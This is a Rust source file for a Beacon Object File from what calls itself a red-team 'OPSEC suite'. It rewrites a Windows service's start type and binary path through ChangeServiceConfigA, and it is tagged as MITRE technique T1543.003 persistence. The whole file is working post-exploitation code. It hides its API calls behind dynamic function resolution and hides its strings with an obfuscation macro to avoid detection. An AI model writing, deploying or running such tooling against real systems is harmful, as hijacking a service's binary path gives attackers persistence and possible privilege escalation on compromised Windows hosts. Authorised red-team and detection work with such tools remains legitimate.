// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
//
//! Change service configuration (start type, binary path).
//! Args: <servicename> <start_type> [bin_path]
//! start_type: auto(2) demand(3) disabled(4) boot(0) system(1)
#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use alloc::string::String;
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1543.003", name: "Windows Service", tactic: "Persistence" },
];

const SC_MANAGER_CONNECT:   u32 = 0x0001;
const SERVICE_CHANGE_CONFIG: u32 = 0x0002;
const SERVICE_NO_CHANGE:     u32 = 0xFFFFFFFF;

dfr_fn!(
    open_sc_manager_a(machine: *const i8, db: *const i8, access: u32) -> usize,
    module = "advapi32.dll",
    api    = "OpenSCManagerA"
);
dfr_fn!(
    open_service_a(scm: usize, svc: *const i8, access: u32) -> usize,
    module = "advapi32.dll",
    api    = "OpenServiceA"
);
dfr_fn!(
    change_service_config_a(
        svc: usize, svc_type: u32, start_type: u32, err_ctrl: u32,
        bin_path: *const i8, load_grp: *const i8, tag_id: *mut u32,
        deps: *const i8, svc_start_name: *const i8,
        password: *const i8, display: *const i8,
    ) -> i32,
    module = "advapi32.dll",
    api    = "ChangeServiceConfigA"
);
dfr_fn!(
    close_service_handle(h: usize) -> i32,
    module = "advapi32.dll",
    api    = "CloseServiceHandle"
);

fn parse_start_type(s: &str) -> Option<u32> {
    if s.eq_ignore_ascii_case("boot")     { return Some(0); }
    if s.eq_ignore_ascii_case("system")   { return Some(1); }
    if s.eq_ignore_ascii_case("auto")     { return Some(2); }
    if s.eq_ignore_ascii_case("demand")   { return Some(3); }
    if s.eq_ignore_ascii_case("disabled") { return Some(4); }
    None
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    let mut parser = rustbof::data::DataParser::new(args, len);
    match run(&mut parser) {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
    let svc_name   = String::from(parser.get_str());
    let start_type = String::from(parser.get_str());
    let bin_path   = String::from(parser.get_str());
    let svc_name   = svc_name.as_str();
    let start_type = start_type.as_str();
    let bin_path   = bin_path.as_str();

    if svc_name.is_empty() || start_type.is_empty() {
        return Err("usage: sc-config <svc> <auto|demand|disabled|boot|system> [bin_path]");
    }

    let start = parse_start_type(start_type).ok_or("unknown start type")?;

    let mut svc_buf = [0u8; 256];
    if svc_name.len() >= svc_buf.len() - 1 { return Err("svc name too long"); }
    svc_buf[..svc_name.len()].copy_from_slice(svc_name.as_bytes());

    let mut bin_buf = [0u8; 1024];
    let bin_ptr = if bin_path.is_empty() {
        core::ptr::null()
    } else {
        if bin_path.len() >= bin_buf.len() - 1 { return Err("bin path too long"); }
        bin_buf[..bin_path.len()].copy_from_slice(bin_path.as_bytes());
        bin_buf.as_ptr() as *const i8
    };

    let scm = unsafe { open_sc_manager_a(core::ptr::null(), core::ptr::null(), SC_MANAGER_CONNECT) }
        .map_err(|_| "open scm resolve")?;
    if scm == 0 { return Err("open scm failed"); }

    let h_svc = unsafe { open_service_a(scm, svc_buf.as_ptr() as *const i8, SERVICE_CHANGE_CONFIG) }
        .map_err(|_| "open svc resolve")?;
    if h_svc == 0 {
        unsafe { let _ = close_service_handle(scm); };
        return Err("open service failed");
    }

    let rc = unsafe {
        change_service_config_a(
            h_svc, SERVICE_NO_CHANGE, start, SERVICE_NO_CHANGE,
            bin_ptr, core::ptr::null(), core::ptr::null_mut(),
            core::ptr::null(), core::ptr::null(),
            core::ptr::null(), core::ptr::null(),
        )
    }.map_err(|_| "config resolve")?;

    unsafe {
        let _ = close_service_handle(h_svc);
        let _ = close_service_handle(scm);
    };
    common::evasion::secure_zero(&mut bin_buf);

    if rc == 0 { return Err("config change failed"); }
    obf! { let ok = "service config updated"; }
    println!("[+] {} ({})", ok, svc_name);
    Ok(())
}
